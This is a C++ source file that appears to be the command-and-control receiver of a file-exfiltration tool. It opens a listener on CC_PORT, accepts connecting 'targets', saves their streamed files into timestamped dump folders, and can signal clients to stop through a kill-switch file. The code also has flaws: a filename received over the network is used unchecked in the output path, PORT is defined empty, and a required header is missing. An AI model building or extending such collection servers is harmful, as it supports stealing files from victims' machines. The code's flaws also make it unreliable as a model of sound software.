#include <iostream>
#include <string>
#include <stdio.h>

#include "Settings.h"
#include "Utils.h"
#include "Socket.h"

#define PORT

void hexDump (const char* desc, const void* addr, const int len) {
    int i;
    unsigned char buff[17];
    const unsigned char * pc = (const unsigned char *)addr;

    // Output description if given.

    if (desc != NULL)
        printf ("%s:\n", desc);

    // Length checks.

    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    else if (len < 0) {
        printf("  NEGATIVE LENGTH: %d\n", len);
        return;
    }

    // Process every byte in the data.

    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Don't print ASCII buffer for the "zeroth" line.

            if (i != 0)
                printf ("  %s\n", buff);

            // Output the offset.

            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);

        // And buffer a printable ASCII character for later.

        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) // isprint() may be better.
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.

    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }

    // And print the final ASCII buffer.

    printf ("  %s\n", buff);
}

bool checkForKill()
{
	std::string in;
	std::ifstream killFile("kill.txt");

	if (killFile.is_open())
	{
		killFile >> in;
		std::cout << in << std::endl;
		if (in == "true")
			return true;
	}

	return false;
}

int receiveFile(Socket& target, const std::string& outFolder)
{
	const size_t buflen = 1024;
	char in[buflen];

	uint8_t response = FAILURE;

	Utils::ClearBuffer(buflen, in);
	
	size_t len = target.Recv(buflen, in);
	if (len == 0 || len > buflen || len < 0)
		return 0;	// Connection closed

	if (checkForKill())
	{
		std::cout << "Kill Switch Active" << std::endl;

		response = KILL;
		target.Send(sizeof(response), (char*)&response);

		return 0;
	}

	if (in[0] != 1)
	{
		std::cout << "Wrong Primary Packet Type Sent" << std::endl;
		// Wrong packet type (failed to receive file)
		target.Send(sizeof(response), (char*)&response);

		// Move to next file
		return 1;
	}

	uint32_t index = 0, totalPackets;
	std::string filename;

	memcpy(&totalPackets, in + 1, 4);
	filename = std::string(in + 5);

	std::ofstream outfile;
	outfile.open(outFolder+"\\"+filename, std::ios::binary);
	if (!outfile.is_open())
	{
		std::cout << "failed to open dump file [" << filename << "]" << std::endl;
		
		response = FAILURE;
		target.Send(sizeof(response), (char*)&response);

		return 1;
	}

	std::cout << "[";
	do
	{
		Utils::ClearBuffer(buflen, in);

		// Give Go-ahead
		response = SUCCESS;
		target.Send(sizeof(response), (char*)&response);

		len = target.Recv(buflen, in);
		if (len == 0)
			return 0;

		if (in[0] != 2)
		{
			std::cout << "Wrong Secondary Packet Type" << std::endl;

			response = FAILURE;
			target.Send(sizeof(response), (char*)&response);
			outfile.close();

			// Continue to next file
			return 1;
		}

		uint16_t length;
		memcpy(&length, in + 1, 2);

		outfile.write(in+3, length);
		std::cout << "*";

		++index;
	} while (index < totalPackets);

	std::cout << "] wrote to file " << filename << " in " << index << " parts" << std::endl;

	outfile.close();

	return 1;
}

int main(int argc, char** argv)
{
	int res;

	ServerSocket server(Utils::ToString(CC_PORT));
	if (!server.IsActive())
	{
		std::cerr << "Server failed to open on port " << CC_PORT << std::endl;
		return 1;
	}
	
	std::cout << "Server opened on port " << CC_PORT << std::endl;

	while (true)
	{
		Socket target = server.Accept();
		if (!target.IsActive())
		{
			std::cout << "Target failed to connect" << std::endl;
			target.Close();
			continue;
		}

		std::string timestamp = Utils::DateTime::Now().GetTimestamp();
		std::string outFolder = "dump_" + timestamp;

		if ((bool)CreateDirectoryA(outFolder.c_str(), NULL))
			std::cout << "Successfully Initialized Output Directory" << std::endl;
		else
			std::cout << "Failed to create Output Directory" << std::endl;

		do
		{
			res = receiveFile(target, outFolder);
		} while (res > 0);
	}

	return 0;
}

